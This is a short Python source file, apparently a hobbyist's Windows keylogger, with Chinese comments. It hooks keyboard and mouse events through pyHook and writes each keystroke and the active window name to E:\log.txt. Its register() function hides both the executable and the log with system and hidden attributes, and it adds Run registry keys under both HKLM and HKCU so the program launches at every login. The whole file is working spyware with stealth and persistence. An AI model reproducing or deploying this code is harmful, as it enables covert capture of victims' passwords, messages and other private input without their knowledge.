# coding:utf-8

import pyHook
import pythoncom
import os
import sys

def register():
    cmd = "attrib +S +H e:\\hook.exe"
    os.popen(cmd)
    cmd = "attrib +S +H E:\\log.txt"
    os.popen(cmd)
    cmd = r"echo yes|reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v hook /d e:\hook.exe"
    os.popen(cmd)
    cmd = r"echo yes|reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v hook /d e:\hook.exe"
    os.popen(cmd)

def onKeyboardEvent(event):
    result = ''
    result += "WindowName:"+ str(event.WindowName) + "\r\n"
    result += "Ascii:"+ str(event.Ascii)+":"+str(chr(event.Ascii)) + "\r\n"
    result += "Key:"+ str(event.Key) + "\r\n"
    result += "KeyID:"+ str(event.KeyID) + "\r\n"
    result += "---end---" + "\r\n"
    file = open('E:\\log.txt','ab')
    file.writelines(result)
    file.close()
    return True


def logger():
    hm = pyHook.HookManager()
    hm.KeyDown = onKeyboardEvent
    # 设置键盘”钩子“
    hm.HookKeyboard()
    # 监听鼠标事件
    hm.HookMouse()
    # 进入循环侦听，需要手动进行关闭，否则程序将一直处于监听的状态。可以直接设置而空而使用默认值
    pythoncom.PumpMessages()
    # 我也不知道为什么直接放置到main函数中不管用


def main():
    register()
    logger()


if __name__ == "__main__":
    main()